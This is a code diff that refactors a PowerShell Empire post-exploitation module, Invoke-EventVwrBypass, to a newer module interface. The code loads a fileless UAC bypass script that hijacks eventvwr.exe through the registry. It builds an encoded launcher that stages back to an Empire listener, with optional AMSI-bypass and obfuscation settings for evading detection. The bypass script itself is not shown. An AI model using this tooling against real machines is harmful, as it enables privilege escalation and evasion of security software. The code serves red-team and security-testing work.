@@ -1,127 +1,39 @@
 from __future__ import print_function
 from builtins import str
 from builtins import object
+from typing import Dict
+
 from empire.server.common import helpers
+from empire.server.common.module_models import PydanticModule
+
 
 class Module(object):
-
-    def __init__(self, mainMenu, params=[]):
-
-        self.info = {
-            'Name': 'Invoke-EventVwrBypass',
-
-            'Author': ['@enigma0x3'],
-
-            'Description': ("Bypasses UAC by performing an image hijack on the .msc file extension and starting eventvwr.exe. "
-                            "No files are dropped to disk, making this opsec safe."),
-
-            'Software': '',
-
-            'Techniques': ['T1088'],
-
-            'Background' : True,
-
-            'OutputExtension' : None,
-            
-            'NeedsAdmin' : False,
-
-            'OpsecSafe' : True,
-            
-            'Language' : 'powershell',
-
-            'MinLanguageVersion' : '2',
-            
-            'Comments': [
-                'https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/',
-            ]
-        }
-
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Obfuscate': {
-                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
-                'Required': False,
-                'Value': 'False'
-            },
-            'ObfuscateCommand': {
-                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
-                'Required': False,
-                'Value': r'Token\All\1'
-            },
-            'AMSIBypass': {
-                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
-                'Required': False,
-                'Value': 'True'
-            },
-            'AMSIBypass2': {
-                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
-                'Required': False,
-                'Value': 'False'
-            },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            },
-            'Proxy' : {
-                'Description'   :   'Proxy to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            },
-            'ProxyCreds' : {
-                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            } 
-        }
-        
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         # Set booleans to false by default
         Obfuscate = False
         AMSIBypass = False
         AMSIBypass2 = False
 
-        listenerName = self.options['Listener']['Value']
+        listenerName = params['Listener']
 
         # staging options
-        userAgent = self.options['UserAgent']['Value']
-        proxy = self.options['Proxy']['Value']
-        proxyCreds = self.options['ProxyCreds']['Value']
-        if (self.options['Obfuscate']['Value']).lower() == 'true':
+        userAgent = params['UserAgent']
+        
+        proxy = params['Proxy']
+        proxyCreds = params['ProxyCreds']
+        if (params['Obfuscate']).lower() == 'true':
             Obfuscate = True
-        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
-        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+        ObfuscateCommand = params['ObfuscateCommand']
+        if (params['AMSIBypass']).lower() == 'true':
             AMSIBypass = True
-        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+        if (params['AMSIBypass2']).lower() == 'true':
             AMSIBypass2 = True
 
         # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-EventVwrBypass.ps1"
+        moduleSource = main_menu.installPath + "/data/module_source/privesc/Invoke-EventVwrBypass.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscation_command)
             moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
@@ -134,13 +46,13 @@ class Module(object):
 
         script = moduleCode
 
-        if not self.mainMenu.listeners.is_listener_valid(listenerName):
+        if not main_menu.listeners.is_listener_valid(listenerName):
             # not a valid listener, return nothing for the script
             print(helpers.color("[!] Invalid listener: " + listenerName))
             return ""
         else:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
+            launcher = main_menu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
                                                                obfuscate=Obfuscate,
                                                                obfuscationCommand=ObfuscateCommand, userAgent=userAgent,
                                                                proxy=proxy,
@@ -155,7 +67,7 @@ class Module(object):
                 scriptEnd = "Invoke-EventVwrBypass -Command \"%s\"" % (encScript)
 
         if obfuscate:
-            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+            scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscation_command)
         script += scriptEnd
         script = helpers.keyword_obfuscation(script)
 
